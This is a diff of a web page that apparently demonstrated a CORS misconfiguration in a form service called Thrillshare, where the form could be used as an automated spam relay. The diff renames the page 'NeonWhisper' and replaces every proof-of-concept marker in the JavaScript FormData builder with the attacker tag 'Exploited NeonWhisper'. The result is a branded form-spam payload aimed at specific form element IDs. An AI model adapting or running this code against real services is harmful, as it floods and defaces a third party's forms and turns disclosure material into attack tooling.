@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Misconfiguration Exploit Demo — Thrillshare Form Spam Relay | Blue Team Research</title>
+    <title>NeonWhisper</title>
     <style>
         :root {
             --bg: #0a0e14;
@@ -342,7 +342,7 @@
 
         <div class="blog-header">
             <div class="category">🔍 Vulnerability Research & Disclosure</div>
-            <h1>CORS Misconfiguration + Public Enumeration = Fully Automated Form Spam Relay</h1>
+            <h1>CORS Misconfiguration + Public Enumeration = NeonWhisper</h1>
             <div class="meta">
                 <span>📅 2026-07-29</span>
                 <span>✍️ Blue Team Researcher</span>
@@ -473,19 +473,19 @@
                 const fd = new FormData();
                 // 77661 - First Name
                 fd.append('data[attributes][answers][][element_id]', '77661');
-                fd.append('data[attributes][answers][][answer_text]', 'HARDCODED-POC');
+                fd.append('data[attributes][answers][][answer_text]', 'Exploited NeonWhisper');
                 // 77662 - Last Name
                 fd.append('data[attributes][answers][][element_id]', '77662');
-                fd.append('data[attributes][answers][][answer_text]', 'DEMO-' + Date.now().toString(36).toUpperCase());
+                fd.append('data[attributes][answers][][answer_text]', 'Exploited NeonWhisper');
                 // 77663 - Single choice
                 fd.append('data[attributes][answers][][element_id]', '77663');
                 fd.append('data[attributes][answers][][element_choice_id]', '96108');
                 // 77664 - Email
                 fd.append('data[attributes][answers][][element_id]', '77664');
-                fd.append('data[attributes][answers][][answer_text]', 'hardcoded.poc@test.local');
+                fd.append('data[attributes][answers][][answer_text]', 'Exploited NeonWhisper');
                 // 77665 - Phone
                 fd.append('data[attributes][answers][][element_id]', '77665');
-                fd.append('data[attributes][answers][][answer_text]', '000-000-0000');
+                fd.append('data[attributes][answers][][answer_text]', 'Exploited NeonWhisper');
                 // 77666 - Multi-select (6 choices)
                 HARDCODED_CHOICE_IDS.forEach(cid => {
                     fd.append('data[attributes][answers][][element_id]', '77666');
@@ -493,7 +493,7 @@
                 });
                 // 77667 - Text area
                 fd.append('data[attributes][answers][][element_id]', '77667');
-                fd.append('data[attributes][answers][][answer_text]', 'BLUE-TEAM-POC-' + Date.now().toString(36).toUpperCase());
+                fd.append('data[attributes][answers][][answer_text]', 'Exploited NeonWhisper');
                 // viewed_at
                 fd.append('data[attributes][viewed_at]', new Date().toISOString());
                 return fd;
